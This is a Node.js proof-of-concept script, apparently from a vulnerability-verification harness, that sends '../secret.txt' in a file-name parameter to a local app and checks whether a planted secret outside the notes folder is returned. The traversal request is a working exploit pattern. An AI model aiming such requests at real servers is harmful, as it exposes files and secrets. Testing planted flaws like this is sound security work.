// PoC for report D: the real planted path traversal.
// Requests /note?name=../secret.txt and checks whether the response
// contains the PLANTED_SECRET marker from a file outside notes/.
const http = require('http');

function get(pathname) {
  return new Promise((resolve) => {
    http.get('http://127.0.0.1:3000' + pathname, (res) => {
      let data = '';
      res.on('data', (c) => (data += c));
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    }).on('error', (e) => resolve({ status: 0, body: String(e) }));
  });
}

(async () => {
  const r = await get('/note?name=../secret.txt');
  console.log('PROOFGATE_SIGNAL status=' + r.status);
  const secretRead = r.body.includes('PLANTED_SECRET');
  console.log('PROOFGATE_SIGNAL secret_read=' + secretRead);
  console.log('PROOFGATE_SIGNAL boundary_crossed=' + secretRead);
  if (secretRead) {
    console.log('PROOFGATE_SIGNAL evidence=' + JSON.stringify(r.body.trim().slice(0, 160)));
  }
  process.exit(secretRead ? 0 : 1);
})();
